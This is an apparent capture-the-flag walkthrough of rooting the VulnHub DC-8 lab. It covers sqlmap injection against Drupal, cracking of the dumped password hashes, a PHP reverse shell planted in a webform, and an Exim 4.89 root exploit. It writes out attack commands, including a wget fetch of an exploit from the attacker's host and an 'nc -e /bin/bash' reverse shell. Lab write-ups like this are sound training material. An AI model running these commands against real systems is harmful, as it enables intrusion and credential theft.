# Description
DC-8 is another purposely built vulnerable lab designed to help gain experience in the world of penetration testing. This challenge is a bit of a hybrid between being an actual challenge and a “proof of concept” to determine whether two-factor authentication installed and configured on Linux can prevent the Linux server from being exploited.

The “proof of concept” portion of this challenge arose from a question about two-factor authentication and Linux on Twitter, coupled with a suggestion by @theart42. The ultimate goal of this challenge is to bypass two-factor authentication, gain root access, and read the one and only flag.

You probably wouldn’t even know that two-factor authentication was installed and configured unless you attempted to log in via SSH, but it’s definitely there and doing its job. Linux skills and familiarity with the Linux command line are essential, as is some experience with basic penetration testing tools. For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for help. However, take note: I won’t give you the answer, but I’ll guide you on how to move forward.

# Introduction
Hey! Harish here, I’ll take you through the steps I took to root the DC-8 vulnerable lab. This lab presented unique challenges. We’ll start with reconnaissance, sql injection vulnerability discovery, exploiting a form that allows php code, and finally exploiting exim4 to achieve privilege escalation to root access. Let’s dive in!

## 1.Getting started (Setup):
As always we start by setting up the working environement and the network.

First we have to download the required machine "https://download.vulnhub.com/dc/DC-8.zip"

I setting up a Bridge Adapter Network for both target machine and Attacker machine.

My setup is the following :

Attacker Machine:

<img width="965" height="587" alt="1" src="https://github.com/user-attachments/assets/d8362018-2328-4438-b7b6-813f30898d76" />

#

Target Machine:

<img width="950" height="587" alt="2" src="https://github.com/user-attachments/assets/47c4ef2e-8909-49f8-867f-02482aa0e81f" />

#

First let’s run netdiscover on the network to detect the target IPv4 address.

```
sudo netdiscover -r 192.168.1.63
```

<img width="1920" height="1022" alt="1" src="https://github.com/user-attachments/assets/12b58f30-d364-4d68-9ad9-360d3386f2ba" />

#

And pick the PCS ip

## 2.Reconnaissance:
# Nmap Scan:
To start with, I fired up an Nmap scan against the target’s IP address. Notably, port 22 (SSH) and port 80 (HTTP) are open. It’s also worth noting that Drupal 7 is running on the web application on port 80.
```
nmap 192.168.1.64
```

<img width="1920" height="1022" alt="2" src="https://github.com/user-attachments/assets/b3801f6e-69e6-41d3-90b5-8b57d78e03a5" />

#

Scan Another scan with -A (Agressive scan) for more  info
```
nmap -A 192.168.1.64
```

<img width="1920" height="1022" alt="3" src="https://github.com/user-attachments/assets/f0cb490d-b0c2-415e-bdc6-d81be8f4930f" />

# Web Enumeration
Upon accessing the web application, I was presented with a landing page. Notably, there was an advisory on the home page mentioning potential disruptions to the site while resolving a few outstanding issues. This could imply possible security misconfigurations that could be exploited.

<img width="1920" height="1022" alt="4" src="https://github.com/user-attachments/assets/32f4ec65-3dd2-48de-aa48-4b83f4e4e899" />

#

After trying each options in the site, i see some different response and found the chance for try the "SQLi" in URL.

<img width="1920" height="1022" alt="5" src="https://github.com/user-attachments/assets/cad4357e-142a-498e-9129-4d4c8649fe42" />

## 3.Exploitation:

# SQLMap

So i try the "SQL injection" using "sqlmap tool". Using command
```
sudo sqlmap -u http://192.168.1.64/?nid=1 --dbs --batch --risk 3 --level 5
```
And we find some Databases

<img width="1920" height="1022" alt="6" src="https://github.com/user-attachments/assets/ec6641e2-6e34-4dab-838c-9520608c6a20" />

#

Using the "d7db" Db for next step
```
sudo sqlmap -u http://192.168.1.64/?nid=1 -D d7db  --tables --batch --risk 3 --level 5
```

<img width="1920" height="1022" alt="8" src="https://github.com/user-attachments/assets/7971a9d1-a1a6-4edc-b78a-bb93d87d161d" />

#

And get lot of tables, i pick the "users" table.

```
sudo sqlmap -u http://192.168.1.64/?nid=1 -D d7db  -T users --batch --risk 3 --level 5
```

<img width="1920" height="1022" alt="9" src="https://github.com/user-attachments/assets/1680187b-eead-428b-8a4f-12ce1ec4fad2" />

#

Finally, I dumped the users table, revealing two user credentials, including names, email addresses, and password hashes.

<img width="1920" height="1022" alt="10" src="https://github.com/user-attachments/assets/27a72961-41ca-4c03-9502-e63374d21b49" />

# Cracking the Hashes
I saved the hashes in a text file called john.txt.
Use the "John The Ripper" tool for crack the password.

<img width="1920" height="1022" alt="11" src="https://github.com/user-attachments/assets/21e930cf-383c-4c9e-bc9f-73bc52c46fc2" />

#

Using John’s credentials, I logged in to the web application.

<img width="1920" height="1022" alt="12" src="https://github.com/user-attachments/assets/fe63b02f-d544-49fe-b224-ad7eec853f01" />

# Exploiting the Webform for Remote Code Execution
After logging in, I revisited the “Contact Us” page and found a Webform tab. I modified the form’s confirmation message to include a PHP reverse shell code, which would execute upon form submission.

<img width="1920" height="1022" alt="14" src="https://github.com/user-attachments/assets/26018860-71dd-4b14-af93-843f08d5d2d6" />

<img width="1920" height="1022" alt="15" src="https://github.com/user-attachments/assets/8b5be1a3-5796-475f-9f03-228a8fea1c87" />

#

After i copy PHP reverse shell code from github, paste it into input field and change the text format to PHP code.

<img width="1920" height="1022" alt="18" src="https://github.com/user-attachments/assets/df43c67f-4145-4c02-8fdf-0f328d0169b6" />

#

Now change the ip=192.168.1.63(Attacker ip) and port= 8889 in the PHP code.

<img width="1920" height="1022" alt="19" src="https://github.com/user-attachments/assets/10e0f2a5-b125-4345-9185-f1de037d8ba7" />

#

I then set up a Netcat listener on my machine to catch the reverse shell connection.

```
nc -lvnp 8886
```

<img width="1920" height="1022" alt="20" src="https://github.com/user-attachments/assets/9b783f91-52c1-46c2-b20e-ccfdd99d367e" />

## 4.Privilege Escalation:
With the listener set up, I filled out the Contact Us form with arbitrary data. Upon submission, the page stalled—a good sign that my payload was executing. The listener picked up the connection, providing me a foothold on the system.

<img width="1920" height="1022" alt="22" src="https://github.com/user-attachments/assets/f95cee45-f033-444b-a5f2-e16d2394919c" />

#

After typing in all that information, we clicked on the submit button. After a few seconds, we got the shell from the target machine. It was a shell of user ‘www-data’. This was an improper shell. So, in order to convert it into a proper shell, we ran the python one-liner mentioned below.
```
python -c 'import pty;pty.spawn("/bin/bash")'
```

<img width="1920" height="1022" alt="24" src="https://github.com/user-attachments/assets/d8b72886-fa49-4ab5-8b83-35244dc50267" />

#

After getting a proper shell, it was a time to escalate privilege on this machine. So, to do that we ran the find command to find the files with the SUID permissions. We found a service named exim4. Now, in order to proceed further, we are going to need the version of the exim4 tool. It will help us in searching for some exploit on the internet. This was found to be 4.89.

```
find / -perm -u=s -type f 2>/dev/null
exim --version | head -1
```

<img width="1920" height="1022" alt="26" src="https://github.com/user-attachments/assets/3d2ace9a-d02d-47d0-8bdb-82e8a822d010" />

# Exploiting Exim4 for Root Access
Further research led me to a local privilege escalation exploit for exim versions 4.87 to 4.91 (https://www.exploit-db.com/exploits/46996).

<img width="1920" height="1022" alt="27" src="https://github.com/user-attachments/assets/091d79a8-0c40-4726-8aa3-e64da819535b" />

#

I copy the raw exploit code from Exploit Database and paste it into exploit.sh file in my local machine(Attacker machine).
Now i want to transfer file into the victim machine. Using python server hosting method. Using this command
```
python -m http.server 8000
```

The first command navigates to the /tmp directory, and the second uses wget to download the exploit script from Attacker machine.
```
cd /tmp
wget http://192.168.1.63:8000/exploit.sh
```

<img width="1920" height="1022" alt="32" src="https://github.com/user-attachments/assets/0afa3bb4-1287-408a-afef-b0458af82ec1" />

#

After transferring the script on the target machine, we gave it proper permissions so that it can execute properly.
Command:
```
chmod 777 exploit.sh
```
After providing with the proper permissions, it’s time to run a listener so that we can capture the shell which would be generated by this script (in Attacker machine). 
Command:
```
nc -lvnp 8800
```

<img width="1920" height="1022" alt="33" src="https://github.com/user-attachments/assets/cb41ec7b-ecbe-47f0-a4da-2a370b20bf0d" />

#

After that, we ran the command with the option to invoke netcat as shown in the image given below.This script invoked a netcat shell to our attacker machine on port 8800. Also you have to use the second command for Reverse shell connection to Attacker Machine.

```
bash exploit.sh -m netcat
nc -e /bin/bash 192.168.1.63 8800
```

<img width="1920" height="1022" alt="34" src="https://github.com/user-attachments/assets/b937142f-8cad-4fa3-a3f4-0b12df34985f" />

# Capture the flag
We successfully got the shell on the target machine. We got a satisfactory response of ‘root’. We traversed into the root directory using the cd command. We found our flag at this location.
Command:
```
cd root
cat flag.txt
```

<img width="1920" height="1022" alt="39" src="https://github.com/user-attachments/assets/d09eab21-111e-4182-b00b-9598c7a8e4f1" />

## 5.Conclusion:

DC-8 presented a unique challenge by demanding a mix of traditional web exploitation, SQL injection, and brute-force password cracking, leading to an initial foothold. The use of Drupal’s webform allowed for a crafty privilege escalation via PHP code injection, ultimately opening a reverse shell. Exploiting the misconfigured Exim4 service further elevated the privileges to root.

This scenario emphasized the importance of thorough enumeration, understanding specific vulnerabilities, and adapting exploit techniques to match the environment. The challenge effectively demonstrated the significance of layering security measures and how even small misconfigurations can lead to full system compromise.
